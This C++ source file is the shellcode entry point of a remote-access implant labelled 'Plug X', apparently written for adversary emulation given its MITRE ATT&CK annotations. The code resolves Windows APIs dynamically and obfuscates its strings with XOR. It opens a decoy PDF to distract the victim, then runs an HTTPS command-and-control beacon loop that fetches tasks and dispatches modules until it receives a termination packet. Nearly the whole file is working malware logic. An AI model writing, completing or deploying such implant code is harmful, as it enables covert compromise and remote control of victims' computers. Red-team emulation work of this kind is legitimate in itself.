#include "shellcode.hpp"
#include "shellcode_util.hpp"
#include "comms.hpp"
#include "logger.hpp"
#include "util.hpp"
#include <al/al.hpp>
#include <string_view>
#include "registry/module_registry.hpp"

#ifndef HTTPS
#error "entry.cpp must have HTTPS set at compile time"
#endif

#define HEAP_SIZE 1024*1024 // 1MB

using namespace al;

/*
 * entry:
 *      About:
 *          Main shellcode entry point. Handles setting up appropriate context
 *          structures, initializing the logger, resolving APIs, opening decoy document,
 *          registering modules, and handling C2 comms and tasking.
 *      MITRE ATT&CK Techniques:
 *          T1071.001: Application Layer Protocol: Web Protocol
 *          T1573.002: Encrypted Channel: Asymmetric Cryptography
 *          T1027.007: Obfuscated Files or Information: Dynamic API Resolution
 */
extern "C"
unsigned int entry() {
    sh_context ctx = { 0 };
    logger_ctx log_ctx = { 0 };
    ctx.log_ctx = &log_ctx;

    DWORD result = FetchFunctions(&(ctx.fp));
    if (result != ERROR_SUCCESS) {
        return result;
    }

    // Start logger
    result = AesLogger::InitializeLogger(&(ctx.fp.shared_fp), XOR_MACRO(WIDEN(SH_LOG_FILE)), ENCRYPTED_LOGGING, ctx.log_ctx);
    if (result != ERROR_SUCCESS) {
        return result;
    }

    AesLogger::LogInfo(ctx.log_ctx, "==========================="_xor);
    AesLogger::LogInfo(ctx.log_ctx, "Initialized Plug X logger."_xor);
    AesLogger::LogInfo(ctx.log_ctx, "==========================="_xor);

    AesLogger::LogInfo(ctx.log_ctx, "Registering modules."_xor);
    DWORD registration = AutoRegisterModules(&ctx);
    if (registration != ERROR_SUCCESS) {
        AesLogger::LogError(ctx.log_ctx, "Failed to register modules. Error code: %d"_xor, registration);
        return registration;
    }

    // initialize comms
    AesLogger::LogInfo(ctx.log_ctx, "Initializing comms."_xor);
    DWORD initialize = Comms::initialize(&ctx, HTTPS);
    if (initialize != ERROR_SUCCESS) {
        return initialize;
    }

    module_context_t m_ctx = {0};

    // open decoy PDF
    // calling registered module
    AesLogger::LogInfo(ctx.log_ctx, "Dispatching module to open decoy PDF."_xor);
    DWORD decoy_pdf = DispatchModule(&ctx, 0x1100, &m_ctx);

    AesLogger::LogDebug(ctx.log_ctx, "PDF result: %d."_xor, decoy_pdf);

    // comms loop
    AesLogger::LogInfo(ctx.log_ctx, "Beginning comms loop."_xor);
    BOOL terminate = FALSE;
    while (!terminate) {
        ctx.fp.fp_Sleep(15000); // Beacon sleep

        char* response = NULL;
        c2_packet pkt = {0};

        // Send get request to c2 along with any pending output
        do {
            DWORD getRequest = Comms::getRequest(&ctx, &m_ctx);
            if (getRequest != ERROR_SUCCESS) {
                // log and continue
                AesLogger::LogError(ctx.log_ctx, "Failed to perform GET request. Error code: %d."_xor, getRequest);
                break;
            }

            // clear m_ctx
            if (m_ctx.output != NULL && m_ctx.outputAlloc) {
                ctx.fp.fp_free(m_ctx.output);
            }
            pi_memset(&m_ctx, 0, sizeof(m_ctx));

            // read c2 response
            DWORD totalSize = 0;
            DWORD readResponse = Comms::readResponse(&ctx, &response, &totalSize);
            if (readResponse != ERROR_SUCCESS) {
                // log and continue
                AesLogger::LogError(ctx.log_ctx, "Failed to read server response. Error code: %d."_xor, readResponse);
                break;
            } else if (response == NULL || totalSize == 0) {
                // empty server response
                AesLogger::LogDebug(ctx.log_ctx, "Empty server response."_xor);
                break;
            }

            // Parse response packet from C2 response data
            // Pointers in pkt are valid until response pointer is freed
            AesLogger::LogDebug(ctx.log_ctx, "Parsing server response packet."_xor);
            DWORD parseResult = Comms::parseResponse(&ctx, response, (size_t)totalSize, &pkt);
            if (parseResult != ERROR_SUCCESS) {
                AesLogger::LogError(ctx.log_ctx, "Failed to parse server response. Error code: %d."_xor, parseResult);
                break;
            }

            // check for module registration
            if (pkt.id == 0) {
                // Null packet from server (e.g. no tasking)
                AesLogger::LogDebug(ctx.log_ctx, "Null task from server."_xor);
                break;
            } else if (pkt.id == 0xFFFF) {
                // Termination
                AesLogger::LogInfo(ctx.log_ctx, "Received termination instruction."_xor);
                terminate = TRUE;
                break;
            } else if (ModuleRegistered(&ctx, pkt.id)) {
                AesLogger::LogDebug(ctx.log_ctx, "Received task for registered module 0x%x."_xor, pkt.id);
                m_ctx.argc = 1;

                // Pointers are valid until response pointer is freed
                m_ctx.argv[0] = pkt.args;
                m_ctx.output = pkt.content;
                m_ctx.outputSize = pkt.contentLength;

                // calling registered module
                AesLogger::LogInfo(ctx.log_ctx, "Dispatching module 0x%x."_xor, pkt.id);
                DWORD dispatch_module = DispatchModule(&ctx, pkt.id, &m_ctx);
                if (dispatch_module != ERROR_SUCCESS) {
                    AesLogger::LogError(ctx.log_ctx, "Failed to dispatch module 0x%x. Error code: %d."_xor, pkt.id, dispatch_module);
                    break;
                }
            } else {
                AesLogger::LogError(ctx.log_ctx, "Received tasking for unregistered or unsupported module 0x%x."_xor, pkt.id);
            }
        } while (FALSE);

        if (response != NULL) {
            ctx.fp.fp_free(response);
            response = NULL;
        }

        if (ctx.hSession != NULL) {
            ctx.fp.fp_InternetCloseHandle(ctx.hSession);
            ctx.hSession = NULL;
        }

        if (ctx.hRequest != NULL) {
            ctx.fp.fp_InternetCloseHandle(ctx.hRequest);
            ctx.hRequest = NULL;
        }
    }

    // teardown comms
    AesLogger::LogInfo(ctx.log_ctx, "Tearing down comms."_xor);
    DWORD teardown = Comms::teardown(&ctx);
    if (teardown != ERROR_SUCCESS) {
        AesLogger::LogError(ctx.log_ctx, "Failed to tear down comms. Error code: %d."_xor, teardown);
        result = teardown;
    }

    AesLogger::LogInfo(ctx.log_ctx, "Closing logger and exiting."_xor);
    AesLogger::CloseLogger(ctx.log_ctx);

    return result;
}
